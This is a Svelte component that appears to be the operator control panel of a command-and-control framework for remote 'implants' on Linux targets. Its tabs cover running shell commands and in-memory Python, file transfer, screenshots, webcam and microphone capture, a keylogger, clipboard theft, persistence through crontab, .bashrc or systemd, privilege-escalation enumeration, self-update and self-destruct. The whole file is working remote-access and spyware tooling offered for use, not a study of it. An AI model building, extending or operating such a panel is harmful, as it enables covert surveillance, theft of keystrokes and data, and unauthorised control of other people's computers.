<script>
  import TaskQueue from './TaskQueue.svelte';

  let { implant, onTaskQueued } = $props();

  let activeTab = $state('execute');
  let busy      = $state(false);
  let statusMsg = $state('');
  let statusOk  = $state(true);

  // ── Per-tab state ────────────────────────────────────────────────────────
  // execute
  let execCmd     = $state('');
  let cmdHistory  = $state([]);
  let histIdx     = $state(-1);
  // upload
  let uploadFile  = $state(null);
  let uploadName  = $state('');
  // download
  let dlPath      = $state('');
  // ls / files
  let lsPath      = $state('.');
  // kill_process
  let killPid     = $state('');
  let killSig     = $state('15');
  // settings / interval
  let interval    = $state(20);
  let updateFile  = $state(null);
  // persist
  let persistMethod = $state('crontab');
  // python exec
  let pyCode        = $state('');
  // notes / tags (settings) — keep in sync when selected implant changes
  let notesText = $state('');
  let tagsText  = $state('');
  $effect(() => {
    notesText = implant.notes ?? '';
    tagsText  = (implant.tags ?? []).join(', ');
  });
  // webcam
  let webcamDevice = $state('/dev/video0');
  // mic
  let micDuration = $state(5);
  let micDevice   = $state('default');
  // destruct
  let destructConfirm = $state(false);

  const TABS = [
    { id: 'execute',    label: '>_ Run'      },
    { id: 'files',      label: '📁 Files'    },
    { id: 'upload',     label: '↑ Upload'    },
    { id: 'screenshot', label: '◉ Screen'   },
    { id: 'webcam',     label: '📷 Webcam'  },
    { id: 'mic',        label: '🎤 Mic'     },
    { id: 'procs',      label: '⊞ Procs'    },
    { id: 'network',    label: '⌇ Network'  },
    { id: 'info',       label: 'ℹ Info'     },
    { id: 'keylogger',  label: '⌨ Keylog'   },
    { id: 'clipboard',  label: '◈ Clip'     },
    { id: 'persist',    label: '⊕ Persist'  },
    { id: 'privesc',    label: '⚡ PrivEsc'  },
    { id: 'python',     label: '⟨⟩ Python'  },
    { id: 'queue',      label: '◷ Queue'    },
    { id: 'settings',   label: '⚙ Config'   },
    { id: 'destruct',   label: '✗ Destruct' },
  ];

  // ── Generic task sender ──────────────────────────────────────────────────
  async function sendTask(payload) {
    busy = true; statusMsg = ''; statusOk = true;
    try {
      const res = await fetch(`/api/task/${implant.id}`, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify(payload),
      });
      const data = await res.json();
      if (data.ok) {
        statusMsg = `✓ Task #${data.task_id} queued`;
        statusOk  = true;
        onTaskQueued?.();
      } else {
        statusMsg = `Error: ${data.error}`;
        statusOk  = false;
      }
    } catch (e) {
      statusMsg = `Request failed: ${e.message}`;
      statusOk  = false;
    } finally {
      busy = false;
    }
  }

  // ── Execute + command history ────────────────────────────────────────────
  function submitExecute() {
    const cmd = execCmd.trim();
    if (!cmd) return;
    if (!cmdHistory.includes(cmd)) cmdHistory = [cmd, ...cmdHistory].slice(0, 50);
    histIdx = -1;
    sendTask({ type: 'execute', command: cmd });
    execCmd = '';
  }

  function execKeydown(e) {
    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); submitExecute(); return; }
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      const next = Math.min(histIdx + 1, cmdHistory.length - 1);
      histIdx = next;
      execCmd = cmdHistory[next] ?? '';
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      const next = Math.max(histIdx - 1, -1);
      histIdx = next;
      execCmd = next === -1 ? '' : cmdHistory[next];
    }
  }

  // ── Upload ───────────────────────────────────────────────────────────────
  async function submitUpload() {
    if (!uploadFile) return;
    const buf = await uploadFile.arrayBuffer();
    const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
    const name = uploadName.trim() || uploadFile.name;
    sendTask({ type: 'upload', filename: name, file: b64 });
    uploadFile = null; uploadName = '';
  }

  // ── Download ─────────────────────────────────────────────────────────────
  function submitDownload() {
    if (!dlPath.trim()) return;
    sendTask({ type: 'download', filepath: dlPath.trim() });
    dlPath = '';
  }

  // ── Files (ls) ───────────────────────────────────────────────────────────
  function submitLs() {
    sendTask({ type: 'ls', path: lsPath.trim() || '.' });
  }

  // ── Screenshot ───────────────────────────────────────────────────────────
  function submitScreenshot() { sendTask({ type: 'screenshot' }); }

  // ── Webcam ───────────────────────────────────────────────────────────────
  function submitWebcam() {
    sendTask({ type: 'webcam_snap', device: webcamDevice.trim() || '/dev/video0' });
  }

  // ── Mic ──────────────────────────────────────────────────────────────────
  function submitMic() {
    const dur = parseInt(micDuration, 10);
    if (!dur || dur < 1 || dur > 300) { statusMsg = 'Duration must be 1–300s'; statusOk = false; return; }
    sendTask({ type: 'mic_record', duration: dur, device: micDevice.trim() || 'default' });
  }

  // ── Processes ────────────────────────────────────────────────────────────
  function submitPs() { sendTask({ type: 'ps' }); }
  function submitKill() {
    const pid = parseInt(killPid.trim(), 10);
    if (!pid || isNaN(pid)) { statusMsg = 'Enter a valid PID'; statusOk = false; return; }
    sendTask({ type: 'kill_process', pid, signal: parseInt(killSig, 10) });
    killPid = '';
  }

  // ── Network ──────────────────────────────────────────────────────────────
  function submitNetstat() { sendTask({ type: 'netstat' }); }

  // ── Sysinfo ──────────────────────────────────────────────────────────────
  function submitSysinfo() { sendTask({ type: 'sysinfo' }); }

  // ── Keylogger ────────────────────────────────────────────────────────────
  function klogStart() { sendTask({ type: 'keylog_start' }); }
  function klogDump()  { sendTask({ type: 'keylog_dump'  }); }
  function klogStop()  { sendTask({ type: 'keylog_stop'  }); }

  // ── Clipboard ────────────────────────────────────────────────────────────
  function submitClip() { sendTask({ type: 'clipboard' }); }

  // ── Persist ──────────────────────────────────────────────────────────────
  function submitPersist()   { sendTask({ type: 'persist',   method: persistMethod }); }
  function submitUnpersist() { sendTask({ type: 'unpersist', method: persistMethod }); }

  // ── PrivEsc ───────────────────────────────────────────────────────────────
  function submitPrivesc() { sendTask({ type: 'privesc_enum' }); }

  // ── Python ───────────────────────────────────────────────────────────────
  function submitPython() {
    if (!pyCode.trim()) return;
    sendTask({ type: 'exec_python', code: pyCode.trim() });
    pyCode = '';
  }

  // ── Settings ─────────────────────────────────────────────────────────────
  function submitInterval() { sendTask({ type: 'set_interval', interval: Number(interval) }); }

  async function submitSelfUpdate() {
    if (!updateFile) return;
    const buf = await updateFile.arrayBuffer();
    const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
    sendTask({ type: 'self_update', payload: b64 });
    updateFile = null;
  }

  async function saveMetadata() {
    busy = true; statusMsg = ''; statusOk = true;
    try {
      const tags = tagsText.split(',').map(t => t.trim()).filter(Boolean);
      const res  = await fetch(`/api/implants/${implant.id}`, {
        method:  'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ notes: notesText, tags }),
      });
      const data = await res.json();
      statusMsg = data.ok ? '✓ Saved' : `Error: ${data.error}`;
      statusOk  = data.ok;
      onTaskQueued?.();
    } catch (e) {
      statusMsg = `Request failed: ${e.message}`; statusOk = false;
    } finally {
      busy = false;
    }
  }

  // ── Destruct ─────────────────────────────────────────────────────────────
  function submitDestruct() {
    if (!destructConfirm) return;
    sendTask({ type: 'self_destruct' });
    destructConfirm = false;
  }

  function switchTab(id) { activeTab = id; statusMsg = ''; statusOk = true; }
</script>

<div class="flex flex-col">

  <!-- Tab bar (horizontally scrollable) -->
  <div class="overflow-x-auto bg-base-200 border-b border-base-300">
    <div role="tablist"
         class="tabs tabs-sm tabs-lifted flex-nowrap whitespace-nowrap w-max min-w-full px-2 pt-1">
      {#each TABS as tab}
        <button
          role="tab"
          class="tab tab-lifted font-mono text-xs px-3 gap-1
                 {activeTab === tab.id ? 'tab-active !text-primary' : 'text-base-content/50 hover:text-base-content'}
                 {tab.id === 'destruct' ? '!text-error hover:!text-error' : ''}"
          onclick={() => switchTab(tab.id)}
        >
          {tab.label}
        </button>
      {/each}
    </div>
  </div>

  <!-- Tab content -->
  <div class="p-3 bg-base-100 min-h-[80px]">

    <!-- >_ Run -->
    {#if activeTab === 'execute'}
      <div class="flex flex-col gap-2">
        <div class="flex gap-2">
          <input
            class="input input-bordered input-sm flex-1 font-mono text-xs bg-base-200"
            placeholder="whoami  (↑↓ for history, Enter to run)"
            bind:value={execCmd}
            onkeydown={execKeydown}
            disabled={busy}
            autocomplete="off" spellcheck="false"
          />
          <button class="btn btn-primary btn-sm font-mono" onclick={submitExecute}
                  disabled={busy || !execCmd.trim()}>
            Run
          </button>
        </div>
        {#if cmdHistory.length > 0}
          <div class="flex flex-wrap gap-1">
            {#each cmdHistory.slice(0,6) as h}
              <button class="badge badge-ghost badge-sm font-mono text-xs cursor-pointer hover:badge-primary"
                      onclick={() => { execCmd = h; histIdx = cmdHistory.indexOf(h); }}>
                {h.length > 24 ? h.slice(0,24)+'…' : h}
              </button>
            {/each}
          </div>
        {/if}
      </div>
    {/if}

    <!-- 📁 Files -->
    {#if activeTab === 'files'}
      <div class="flex flex-col gap-2">
        <div class="flex gap-2">
          <input
            class="input input-bordered input-sm flex-1 font-mono text-xs bg-base-200"
            placeholder="Remote path  (e.g. /etc)"
            bind:value={lsPath}
            onkeydown={(e) => e.key==='Enter' && submitLs()}
            disabled={busy}
          />
          <button class="btn btn-primary btn-sm" onclick={submitLs} disabled={busy}>
            List
          </button>
        </div>
        <div class="flex gap-2">
          <input
            class="input input-bordered input-sm flex-1 font-mono text-xs bg-base-200"
            placeholder="Remote path to download"
            bind:value={dlPath}
            onkeydown={(e) => e.key==='Enter' && submitDownload()}
            disabled={busy}
          />
          <button class="btn btn-secondary btn-sm" onclick={submitDownload}
                  disabled={busy || !dlPath.trim()}>
            Download
          </button>
        </div>
      </div>
    {/if}

    <!-- ↑ Upload -->
    {#if activeTab === 'upload'}
      <div class="flex flex-col gap-2">
        <input type="file"
               class="file-input file-input-bordered file-input-sm w-full bg-base-200"
               onchange={(e) => uploadFile = e.target.files[0]}
               disabled={busy} />
        <div class="flex gap-2">
          <input class="input input-bordered input-sm flex-1 bg-base-200"
                 placeholder="Remote path (blank = original name)"
                 bind:value={uploadName} disabled={busy} />
          <button class="btn btn-primary btn-sm" onclick={submitUpload}
                  disabled={busy || !uploadFile}>
            Upload
          </button>
        </div>
      </div>
    {/if}

    <!-- ◉ Screenshot -->
    {#if activeTab === 'screenshot'}
      <div class="flex items-center gap-3">
        <p class="text-xs text-base-content/50 flex-1">
          Capture the implant's screen.
          Requires <code class="kbd kbd-xs">scrot</code> or
          <code class="kbd kbd-xs">imagemagick</code> on the target.
        </p>
        <button class="btn btn-primary btn-sm" onclick={submitScreenshot} disabled={busy}>
          Capture
        </button>
      </div>
    {/if}

    <!-- 📷 Webcam -->
    {#if activeTab === 'webcam'}
      <div class="flex flex-col gap-3">
        <p class="text-xs text-base-content/50">
          Capture one frame from the target's webcam.
          Requires <code class="kbd kbd-xs">fswebcam</code> or
          <code class="kbd kbd-xs">ffmpeg</code> on the target.
        </p>
        <div class="flex items-center gap-2">
          <label for="wcam-device" class="text-xs text-base-content/50 w-16 shrink-0">Device</label>
          <input id="wcam-device" class="input input-bordered input-sm flex-1 font-mono bg-base-100"
                 placeholder="/dev/video0"
                 bind:value={webcamDevice} />
        </div>
        <button class="btn btn-primary btn-sm self-end" onclick={submitWebcam} disabled={busy}>
          Snap
        </button>
      </div>
    {/if}

    <!-- 🎤 Mic -->
    {#if activeTab === 'mic'}
      <div class="flex flex-col gap-3">
        <p class="text-xs text-base-content/50">
          Record audio from the target's microphone.
          Requires <code class="kbd kbd-xs">arecord</code> or
          <code class="kbd kbd-xs">ffmpeg</code> on the target.
        </p>
        <div class="flex items-center gap-2">
          <label for="mic-dur" class="text-xs text-base-content/50 w-16 shrink-0">Duration</label>
          <input id="mic-dur" class="input input-bordered input-sm w-24 font-mono bg-base-100"
                 type="number" min="1" max="300"
                 bind:value={micDuration} />
          <span class="text-xs text-base-content/40">seconds (1–300)</span>
        </div>
        <div class="flex items-center gap-2">
          <label for="mic-device" class="text-xs text-base-content/50 w-16 shrink-0">Device</label>
          <input id="mic-device" class="input input-bordered input-sm flex-1 font-mono bg-base-100"
                 placeholder="default"
                 bind:value={micDevice} />
        </div>
        <button class="btn btn-primary btn-sm self-end" onclick={submitMic} disabled={busy}>
          Record
        </button>
      </div>
    {/if}

    <!-- ⊞ Processes -->
    {#if activeTab === 'procs'}
      <div class="flex flex-col gap-3">
        <div class="flex items-center gap-3">
          <p class="text-xs text-base-content/50 flex-1">
            List all running processes on the target.
          </p>
          <button class="btn btn-primary btn-sm" onclick={submitPs} disabled={busy}>
            List Procs
          </button>
        </div>
        <div class="divider my-0 text-xs text-base-content/30">Kill Process</div>
        <div class="flex gap-2">
          <input class="input input-bordered input-sm w-28 font-mono bg-base-200"
                 placeholder="PID" bind:value={killPid} disabled={busy}
                 onkeydown={(e) => e.key==='Enter' && submitKill()} />
          <select class="select select-bordered select-sm w-40 bg-base-200"
                  bind:value={killSig} disabled={busy}>
            <option value="15">SIGTERM (15)</option>
            <option value="9">SIGKILL  (9)</option>
            <option value="1">SIGHUP   (1)</option>
            <option value="2">SIGINT   (2)</option>
          </select>
          <button class="btn btn-warning btn-sm" onclick={submitKill}
                  disabled={busy || !killPid.trim()}>
            Kill
          </button>
        </div>
      </div>
    {/if}

    <!-- ⌇ Network -->
    {#if activeTab === 'network'}
      <div class="flex items-center gap-3">
        <p class="text-xs text-base-content/50 flex-1">
          Show active TCP connections and listening ports
          (reads <code class="kbd kbd-xs">/proc/net/tcp</code>).
        </p>
        <button class="btn btn-primary btn-sm" onclick={submitNetstat} disabled={busy}>
          Show Connections
        </button>
      </div>
    {/if}

    <!-- ℹ Info -->
    {#if activeTab === 'info'}
      <div class="flex items-center gap-3">
        <p class="text-xs text-base-content/50 flex-1">
          Hostname, OS, user, uptime, CPU, memory, CWD, implant path and PID.
        </p>
        <button class="btn btn-primary btn-sm" onclick={submitSysinfo} disabled={busy}>
          Get Info
        </button>
      </div>
    {/if}

    <!-- ⌨ Keylog -->
    {#if activeTab === 'keylogger'}
      <div class="flex flex-col gap-2">
        <p class="text-xs text-base-content/40">
          Python implant only — requires <code class="kbd kbd-xs">pynput</code>.
          Keystrokes accumulate until you Dump.
        </p>
        <div class="flex gap-2">
          <button class="btn btn-success btn-sm flex-1" onclick={klogStart} disabled={busy}>▶ Start</button>
          <button class="btn btn-warning btn-sm flex-1" onclick={klogDump}  disabled={busy}>⬇ Dump</button>
          <button class="btn btn-error   btn-sm flex-1" onclick={klogStop}  disabled={busy}>■ Stop</button>
        </div>
      </div>
    {/if}

    <!-- ◈ Clipboard -->
    {#if activeTab === 'clipboard'}
      <div class="flex items-center gap-3">
        <p class="text-xs text-base-content/50 flex-1">
          Grab the implant's clipboard. Tries xclip → xsel → wl-paste.
        </p>
        <button class="btn btn-primary btn-sm" onclick={submitClip} disabled={busy}>
          Grab
        </button>
      </div>
    {/if}

    <!-- ⊕ Persist -->
    {#if activeTab === 'persist'}
      <div class="flex flex-col gap-3">
        <div class="flex items-center gap-3">
          <label for="persist-method" class="text-xs text-base-content/60 shrink-0 w-20">Method</label>
          <select id="persist-method" class="select select-bordered select-sm flex-1 bg-base-200"
                  bind:value={persistMethod} disabled={busy}>
            <option value="crontab">@reboot crontab</option>
            <option value="bashrc">~/.bashrc (on login)</option>
            <option value="systemd">systemd user service</option>
          </select>
        </div>
        <div class="flex gap-2">
          <button class="btn btn-warning btn-sm flex-1" onclick={submitPersist}   disabled={busy}>Install</button>
          <button class="btn btn-error   btn-sm flex-1" onclick={submitUnpersist} disabled={busy}>Remove All</button>
        </div>
        <p class="text-xs text-base-content/30">Remove All clears crontab, ~/.bashrc, and systemd simultaneously.</p>
      </div>
    {/if}

    <!-- ⚡ PrivEsc -->
    {#if activeTab === 'privesc'}
      <div class="flex flex-col gap-2">
        <p class="text-xs text-base-content/50">
          Enumerates SUID binaries, sudo permissions, writable /etc files,
          Linux capabilities, and key environment variables.
        </p>
        <div class="flex justify-end">
          <button class="btn btn-warning btn-sm" onclick={submitPrivesc} disabled={busy}>
            Enumerate
          </button>
        </div>
      </div>
    {/if}

    <!-- ⟨⟩ Python -->
    {#if activeTab === 'python'}
      <div class="flex flex-col gap-2">
        <textarea
          class="textarea textarea-bordered textarea-sm font-mono text-xs w-full h-24 resize-y bg-base-200"
          placeholder="import os&#10;print(os.listdir('/tmp'))"
          bind:value={pyCode} disabled={busy}
        ></textarea>
        <div class="flex justify-between items-center">
          <p class="text-xs text-base-content/30">
            Runs via <code>exec()</code> in the implant process — no file written.
          </p>
          <button class="btn btn-primary btn-sm" onclick={submitPython}
                  disabled={busy || !pyCode.trim()}>
            Execute In-Memory
          </button>
        </div>
      </div>
    {/if}

    <!-- ◷ Task Queue -->
    {#if activeTab === 'queue'}
      <TaskQueue implant={implant} onCancelled={onTaskQueued} />
    {/if}

    <!-- ⚙ Config / Settings -->
    {#if activeTab === 'settings'}
      <div class="flex flex-col gap-4">
        <!-- Beacon interval -->
        <div class="flex items-center gap-3">
          <label for="beacon-interval" class="text-xs text-base-content/60 w-36 shrink-0">Beacon interval (s)</label>
          <input id="beacon-interval" type="number" class="input input-bordered input-sm w-24 bg-base-200"
                 bind:value={interval} min="1" disabled={busy} />
          <button class="btn btn-warning btn-sm" onclick={submitInterval} disabled={busy}>Set</button>
        </div>

        <!-- Notes + tags -->
        <div class="flex flex-col gap-2 border-t border-base-300 pt-3">
          <p class="text-xs font-semibold text-base-content/40 uppercase tracking-wider">
            Operator Notes
          </p>
          <textarea
            class="textarea textarea-bordered textarea-xs w-full bg-base-200 h-14 resize-none"
            placeholder="Notes about this implant…"
            bind:value={notesText} disabled={busy}
          ></textarea>
          <input
            class="input input-bordered input-xs w-full bg-base-200"
            placeholder="Tags (comma-separated, e.g. linux, admin, pivot)"
            bind:value={tagsText} disabled={busy}
          />
          <div class="flex justify-end">
            <button class="btn btn-primary btn-xs" onclick={saveMetadata} disabled={busy}>Save</button>
          </div>
        </div>

        <!-- Self-update -->
        <div class="flex flex-col gap-2 border-t border-base-300 pt-3">
          <p class="text-xs font-semibold text-base-content/40 uppercase tracking-wider">
            Self-Update  <span class="normal-case text-base-content/30">(Python implant)</span>
          </p>
          <p class="text-xs text-base-content/30">
            Upload a replacement .py script — implant overwrites itself and re-execs.
          </p>
          <div class="flex gap-2">
            <input type="file" accept=".py"
                   class="file-input file-input-bordered file-input-xs flex-1 bg-base-200"
                   onchange={(e) => updateFile = e.target.files[0]}
                   disabled={busy} />
            <button class="btn btn-warning btn-xs shrink-0" onclick={submitSelfUpdate}
                    disabled={busy || !updateFile}>
              Deploy
            </button>
          </div>
        </div>
      </div>
    {/if}

    <!-- ✗ Destruct -->
    {#if activeTab === 'destruct'}
      <div class="flex flex-col gap-3">
        <div class="alert alert-error text-xs py-2 gap-2">
          <span>
            Removes persistence (crontab / bashrc / systemd), deletes the implant
            binary/script, and terminates the process. <strong>Irreversible.</strong>
          </span>
        </div>
        <label class="flex items-center gap-2 cursor-pointer select-none">
          <input type="checkbox" class="checkbox checkbox-error checkbox-sm"
                 bind:checked={destructConfirm} />
          <span class="text-sm">I confirm — destroy this implant</span>
        </label>
        <button class="btn btn-error btn-sm w-full font-mono tracking-wider"
                onclick={submitDestruct}
                disabled={busy || !destructConfirm}>
          ✗  SELF-DESTRUCT
        </button>
      </div>
    {/if}

    <!-- Status line -->
    {#if statusMsg}
      <p class="text-xs mt-2 font-mono {statusOk ? 'text-success' : 'text-error'}">{statusMsg}</p>
    {/if}

  </div>
</div>
